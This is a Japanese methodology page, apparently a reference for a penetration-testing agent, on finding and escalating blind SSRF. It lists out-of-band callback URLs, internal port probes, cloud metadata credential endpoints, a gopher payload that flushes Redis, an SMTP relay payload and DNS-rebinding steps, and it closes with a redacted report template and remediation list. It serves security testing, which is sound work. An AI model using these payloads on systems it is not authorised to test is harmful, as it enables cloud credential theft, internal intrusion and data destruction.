# Blind SSRF Exploitation

`server-side` の Phase 2 から呼ばれる、応答に外部 fetch 結果が反映されない経路の OAST / DNS / timing による検出と escalation。

## いつ切替えるか

- 入力 URL / webhook / callback URL を取り、応答にその fetch 結果が直接反映されない
- PDF generator / OG preview / avatar fetcher / file import / SSO 連携 / webhook 受信
- 出力差分が無いので普通の SSRF 試験では成立しているか不明な状況

応答に fetch 内容が返るなら `references/ssrf-visible.md` に切替える。

## Phase 1 — 注入点の発見

```
- ?url= / ?image= / ?import_from= / ?webhook=
- JSON body の {"url":"..."} / {"src":"..."}
- file metadata (PDF link / SVG external resource / RSS feed)
- profile picture from URL
- import from Google Drive / Dropbox URL
```

## Phase 2 — OAST 設定

`interactsh-client` / `canarytokens` / burp Collaborator のいずれかで OAST domain を確保:

```
$ interactsh-client
[INF] Listening with the following payloads:
[INF] xxxxxx.oast.fun
```

## Phase 3 — DNS / HTTP callback で発火確認

```
?url=http://<my-id>.oast.fun/
?url=http://attacker.<my-id>.oast.fun/        # subdomain でログ識別
```

OAST にヒットしたら SSRF 成立。HTTP リクエストが来れば:

- `User-Agent` で fetcher 種別が分かる (Headless Chrome / Go-http-client / curl / wget / Python-urllib)
- `X-Forwarded-For` / `Via` / `Server` で内部 proxy の有無が分かる

DNS のみヒットして HTTP が来ないパターン:

- DNS resolution は通るが内部 firewall が外向き HTTP を block
- response を待たず DNS だけ resolve して終わる実装

## Phase 4 — 内部スキャン

OAST 経由で SSRF 成立を確認したら、内部 IP 範囲を試行:

```
http://127.0.0.1:80
http://127.0.0.1:6379                  # redis
http://127.0.0.1:9200                  # elasticsearch
http://127.0.0.1:8080                  # 内部 admin
http://10.0.0.1:80                     # private
http://kubelet.cluster.local:10250
```

応答時間差 (timing) で port 開放を判定:

```
- 開放 port: 数 ms 〜 数十 ms
- closed port: TCP RST → 短時間でエラー応答
- filtered port: タイムアウト (数秒)
```

`?url=http://127.0.0.1:6379` で 「connection refused」が「timed out」と異なる error message なら絞り込めることも。

## Phase 5 — Cloud metadata へのアクセス

```
AWS:    http://169.254.169.254/latest/meta-data/
        http://169.254.169.254/latest/api/token (IMDSv2)
GCP:    http://metadata.google.internal/computeMetadata/v1/?recursive=true
        Header: Metadata-Flavor: Google
Azure:  http://169.254.169.254/metadata/instance?api-version=2021-02-01
        Header: Metadata: true
DO:     http://169.254.169.254/metadata/v1/
Aliyun: http://100.100.100.200/latest/meta-data/
```

Header を仕込めない fetcher で IMDSv2 が必要な場合は failed fallback を見る (IMDSv1 が有効な古い設定を狙う)。

## Phase 6 — protocol smuggling (`gopher://`)

response 内容を取り出せなくても、副作用ある protocol を仕込めれば内部影響:

```
gopher://127.0.0.1:6379/_FLUSHALL%0d%0a       # Redis flush
gopher://127.0.0.1:25/_HELO%20a%0d%0a...      # SMTP relay
gopher://internal-mq:5672/_...                 # AMQP / MQTT
```

`gopherus` で payload 自動生成。

## Phase 7 — DNS rebinding

URL allow-list で IP / domain を validate するが、`fetch()` が後から再 resolve する実装:

```
1. attacker.com が DNS TTL=0 で 1.2.3.4 を返す (allowed)
2. アプリが「allow」判定 → fetch 開始
3. アプリが再 resolve → attacker.com が今度は 127.0.0.1 を返す
4. 内部にアクセス
```

`rbndr.us` / `whonow` などの service で再現。

## Phase 8 — 結果まとめ

```
- 注入点 / fetcher 種別 (UA / 外向き proxy)
- 内部到達した IP / port
- cloud metadata 取得有無 (取得した token / role を redact)
- 副作用の有無 (gopher で何を発火したか)
- 修正 (private IP block / IMDSv2 強制 / 外向き allowlist)
```

## Tools

```
interactsh-client / canarytokens / burp Collaborator
gopherus
ffuf
WebFetch
Bash (sandbox)
```
